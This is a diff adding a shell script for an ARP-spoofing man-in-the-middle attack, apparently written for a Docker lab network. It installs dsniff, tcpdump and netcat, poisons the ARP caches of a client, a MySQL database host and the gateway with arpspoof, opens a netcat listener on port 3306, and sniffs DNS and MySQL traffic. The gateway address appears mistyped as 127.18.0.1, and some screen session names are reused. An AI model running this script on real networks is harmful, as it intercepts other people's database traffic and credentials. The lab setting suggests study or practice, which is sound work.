@@ -1,0 +1,36 @@
+echo "nameserver 8.8.8.8" > /etc/resolv.conf
+apt install vim screen dsniff tcpdump python3-dev iputils-ping net-tools python3-pip netcat
+
+# disable libnetfilter-queue-dev
+python3 -m pip install scapy
+
+ping 172.18.0.1 -c 3
+ping 172.18.0.2 -c 3
+ping 172.18.0.3 -c 3
+ping 172.18.0.4 -c 3
+
+arp -a
+
+read -p "Who's client ? " client
+read -p "Who's db ?" db
+read -p "Who are we ?" host
+
+echo "$host db.arp-spoofing-dist-2_default" >> /etc/hosts
+echo "$host client.arp-spoofing-dist-2_default" >> /etc/hosts
+
+gw="127.18.0.1"
+# tell each part we're dst
+screen -dmS arp0 arpspoof -t $client $db
+screen -dmS arp1 arpspoof -t $db $client
+# tell client and server we're gateway
+screen -dmS gw0 arpspoof -t $client $gw
+screen -dmS gw0 arpspoof -t $db $gw
+# tell gw we're client
+screen -dmS gw1 arpspoof -t $gw $client
+screen -dmS gw1 arpspoof -t $gw $db
+# open port listening
+screen -dmS dbsock nc -l 3306
+# sniffing traffic
+screen -dmS dns tcpdump udp dst port 53 and not src $host
+screen -dmS mysql tcpdump tcp dst port 3306 or src port 3306 -XXv
+
